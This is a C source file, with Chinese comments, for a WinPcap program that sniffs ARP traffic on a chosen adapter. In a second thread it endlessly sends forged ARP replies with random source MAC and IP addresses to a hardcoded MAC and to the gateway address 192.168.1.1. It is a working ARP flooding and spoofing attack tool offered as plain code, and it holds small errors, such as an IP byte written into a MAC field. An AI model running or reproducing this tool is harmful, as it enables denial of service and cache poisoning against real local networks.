#include "demo.h"

pcap_t *adhandle;
DWORD WINAPI loop(LPVOID lpParameter){
	/* 开始捕获 */
	pcap_loop(adhandle, 0, packet_handler, NULL);
	return 0;
}
DWORD WINAPI loop2(LPVOID lpParameter) {

	while (true) {
		EArpHeader ARPH = filtpacket();
		if (pcap_sendpacket(adhandle, // Adapter
			(u_char *)&ARPH, // buffer with the packet
			sizeof(ARPH)// size
			) != 0)
		{
			printf("发送数据包失败\n");
		}
		//else
		//printf("发送数据包成功！\n");
	}
	return 0;
}

int main() {
	srand((int)time(0));
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;  
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE + 1];
	//char source[PCAP_ERRBUF_SIZE + 1];
	u_int netmask;
	char packet_filter[] = "arp";
	struct bpf_program fcode;

	/*printf("Enter the device you want to list:\n"
	"rpcap://              ==> lists interfaces in the local machine\n"
	"rpcap://hostname:port ==> lists interfaces in a remote machine\n"
	"                          (rpcapd daemon must be up and running\n"
	"                           and it must accept 'null' authentication)\n"
	"file://foldername     ==> lists all pcap files in the give folder\n\n"
	"Enter your choice: ");

	fgets(source, PCAP_ERRBUF_SIZE, stdin);
	source[PCAP_ERRBUF_SIZE] = '\0';*/

	/* 获得接口列表 */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}


	/* 扫描列表并打印每一项 */
	for (d = alldevs; d; d = d->next) {
		printf("%d.", ++i);
		ifprint(d);
	}

	if (!i) {
		printf("\nNo interface found! Make sure WinPacp is installed.\n");
		return -1;
	}

	printf("Enter the interface number （1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i) {
		printf("\nInterface number out of range.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* 跳转到选中的适配器 */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/* 打开设备 */
	if ((adhandle = pcap_open(d->name,          // 设备名
		65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
		PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式。 see more(F12 in VS)
		1000,             // 读取超时时间
		NULL,             // 远程机器验证
		errbuf            // 错误缓冲池
		)) == NULL) {
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_datalink(adhandle) != DLT_EN10MB) {
		fprintf(stderr, "\nThis program works only on Ethernet networks.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (d->addresses != NULL) {
		/* 获得接口第一个地址的掩码 */
		netmask = ((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	}
	else {
		/* 如果接口没有地址，那么我们假设一个C类的掩码 */
		netmask = 0xffffff;
	}

	//编译过滤器
	if (pcap_compile(adhandle, &fcode, packet_filter, 1, netmask) < 0) {
		fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	//编译过滤器
	if (pcap_setfilter(adhandle, &fcode) < 0) {
		fprintf(stderr, "\nError setting the filter.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;

	}

	printf("\nlistening on %s...\n", d->description);

	/* 释放设备列表 */
	pcap_freealldevs(alldevs);

	HANDLE hThread1 = CreateThread(NULL, 0, loop, NULL, 0, NULL);
	HANDLE hThread2 = CreateThread(NULL, 0, loop2, NULL, 0, NULL);
	CloseHandle(hThread1);
	CloseHandle(hThread2);
	while(true) {}
	return 1;
}



//=====================================================================
//填充APR数据包
//======================================================================
EArpHeader filtpacket()
{
	EArpHeader ARPH; //发送的ARP包结构
					 //先初始化三层ARP的MAC地址
	int rnd[6];
	for (int i = 0; i < 6; i++) 
		rnd[i] = 1 + (int)((double)0xFF * rand() / (RAND_MAX + 1.0));

	/* EtherHeader 设置 */
	ARPH.FrameHeader.sSrcMac.byte1 = rnd[0]; ARPH.FrameHeader.sSrcMac.byte2 = rnd[1]; ARPH.FrameHeader.sSrcMac.byte3 = rnd[2];
	ARPH.FrameHeader.sSrcMac.byte4 = rnd[3]; ARPH.FrameHeader.sSrcMac.byte5 = rnd[4]; ARPH.FrameHeader.sSrcMac.byte6 = rnd[5]; //源MAC地址



																															   //ARPH.FrameHeader.sDstMac.byte1 = 0xff; ARPH.FrameHeader.sDstMac.byte2 = 0xff; ARPH.FrameHeader.sDstMac.byte3 = 0xff;
																															   //ARPH.FrameHeader.sDstMac.byte4 = 0xff; ARPH.FrameHeader.sDstMac.byte5 = 0xff; ARPH.FrameHeader.sDstMac.byte6 = 0xff; //目标MAC地址
	ARPH.FrameHeader.sDstMac.byte1 = 0xa4; ARPH.FrameHeader.sDstMac.byte2 = 0x7e; ARPH.FrameHeader.sDstMac.byte3 = 0x39;
	ARPH.FrameHeader.sDstMac.byte4 = 0xa9; ARPH.FrameHeader.sDstMac.byte5 = 0x3a; ARPH.FrameHeader.sDstMac.byte6 = 0x39; //目标MAC地址


	ARPH.FrameHeader.nEthType = htons(0x0806);	//协议类型为ARP


	/* ArpHeader 设置 */
	ARPH.nHardType = htons(0x0001);				//10M Ethernet
	ARPH.nProtoType = htons(0x0800);			//协议类型为IP
	ARPH.nMacLen = 6;							//硬件地址长度
	ARPH.nProtoLen = 4;							//IP地址长度
	ARPH.nOpCode = htons(0x0002);				//请求操作

	//ARPH.sDstMac.byte1 = 0x00; ARPH.sDstMac.byte2 = 0x00; ARPH.sDstMac.byte3 = 0x00;
	//ARPH.sDstMac.byte4 = 0x00; ARPH.sDstMac.byte5 = 0x00; ARPH.sDstMac.byte6 = 0x00;		//目标MAC地址
	ARPH.sDstMac.byte1 = 0xa4; ARPH.sDstMac.byte2 = 0x7e; ARPH.sDstMac.byte3 = 0x39;
	ARPH.sDstMac.byte4 = 0xa9; ARPH.sDstMac.byte5 = 0x3a; ARPH.sDstMac.byte6 = 0x39;		//目标MAC地址


	ARPH.sSrcMac.byte1 = rnd[0]; ARPH.sSrcMac.byte2 = rnd[1]; ARPH.sSrcMac.byte3 = rnd[2];
	ARPH.sSrcMac.byte4 = rnd[3]; ARPH.sSrcMac.byte5 = rnd[4]; ARPH.sSrcMac.byte6 = rnd[5]; //源MAC地址

	ARPH.sSrcIp.byte1 = 1 + (int)(255.0 * rand() / (RAND_MAX + 1.0)); 
	ARPH.sSrcIp.byte2 = 1 + (int)(255.0 * rand() / (RAND_MAX + 1.0));
	ARPH.sSrcIp.byte3 = 1 + (int)(255.0 * rand() / (RAND_MAX + 1.0));
	ARPH.sSrcMac.byte4 = 1 + (int)(255.0 * rand() / (RAND_MAX + 1.0));										//源IP地址

	ARPH.sDstIp.byte1 = 192; ARPH.sDstIp.byte2 = 168; ARPH.sDstIp.byte3 = 1; ARPH.sDstIp.byte4 = 1;		//目标IP地址

	///* ArpPading 设置 */
	//for (int i = 0; i<18; i++) {
	//	ARPH.padding[i] = 0;
	//}
	return ARPH;
};

/* 每次捕获到数据包时，libpcap都会自动调用这个回调函数 */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
	
	//struct tm * ltime;
	//char timestr[16];
	//time_t local_tv_sec;

	///* 将时间戳转换成可识别的格式 */
	//local_tv_sec = header->ts.tv_sec;
	//ltime = localtime(&local_tv_sec);
	//strftime(timestr, sizeof(timestr), "%H:%M:%S", ltime);

	//printf("%s,%.6d len:%d\n", timestr, header->ts.tv_usec, header->len);

	ArpHeader *ah;
	
	ah = (ArpHeader *)(pkt_data +
		14); //以太网头部长度


	/* 输出源IP地址，目的IP地址 */
	printf("%d.%d.%d.%d\n",
	ah->sSrcIp.byte1,
	ah->sSrcIp.byte2,
	ah->sSrcIp.byte3,
	ah->sSrcIp.byte4);
	printf("%d.%d.%d.%d\n",
	ah->sDstIp.byte1,
	ah->sDstIp.byte2,
	ah->sDstIp.byte3,
	ah->sDstIp.byte4);

	MacAddr sMac, dMac;
	EthernetHeader *eh;
	eh = (EthernetHeader *)pkt_data;
	sMac = eh->sSrcMac;
	dMac = eh->sDstMac;
	printf("源地址 %.2x--%.2x--%.2x--%.2x--%.2x--%.2x\n"
		, sMac.byte1, sMac.byte2, sMac.byte3, sMac.byte4, sMac.byte5, sMac.byte6);
	printf("目的地址 %.2x--%.2x--%.2x--%.2x--%.2x--%.2x\n"
		, dMac.byte1, dMac.byte2, dMac.byte3, dMac.byte4, dMac.byte5, dMac.byte6);
	printf("帧协议 %.4x\n", ntohs(eh->nEthType));
	printf("硬件类型%.4x\n", ntohs(ah->nHardType));
	printf("协议类型%.4x\n", ntohs(ah->nProtoType));
	printf("操作类型%.4x\n", ntohs(ah->nOpCode));
	printf("\n\n==============================================================\n");

}

/* 打印所有可用信息 */
void ifprint(pcap_if_t *d) {
	pcap_addr_t *a;
	char ip6str[128];

	/* 设备名(Name) */
	printf("%s\n", d->name);

	/* 设备描述(Description) */
	if (d->description)
		printf("\tDescription: %s\n", d->description);

	/* Loopback Address*/
	printf("\tLoopback: %s\n", (d->flags & PCAP_IF_LOOPBACK));

	/* IP addresses */
	for (a = d->addresses; a; a = a->next) {
		printf("\tAddress Family: #%d\n", a->addr->sa_family);

		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				printf("\tAddress: %s\n", iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			if (a->netmask)
				printf("\tNetmask: %s\n", iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			if (a->broadaddr)
				printf("\tBroadcast Address: %s\n", iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
			if (a->dstaddr)
				printf("\tDestination Address: %s\n", iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
			break;
		case AF_INET6:
			printf("\tAddress Family Name: AF_INET6\n");
			if (a->addr)
				printf("\tAddress: %s\n", ip6tos(a->addr, ip6str, sizeof(ip6str)));
			break;
		default:
			printf("\tAddress Family Name: Unknown\n");
			break;
		}
	}
	printf("\n");
}


/* 将数字类型的IP地址转换成字符串类型的 */
#define IPTOSBUFFERS 12
char * iptos(u_long in) {
	static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char * ip6tos(struct sockaddr *sockaddr, char *address, int addrlen) {
	socklen_t sockaddrlen;

#ifdef WIN32
	sockaddrlen = sizeof(struct sockaddr_in6);
#else
	sockaddrlen = sizeof(struct sockaddr_storage);
#endif // WIN32

	if (getnameinfo(sockaddr,
		sockaddrlen,
		address,
		addrlen,
		NULL,
		0,
		NI_NUMERICHOST) != 0) address = NULL;

	return address;
}

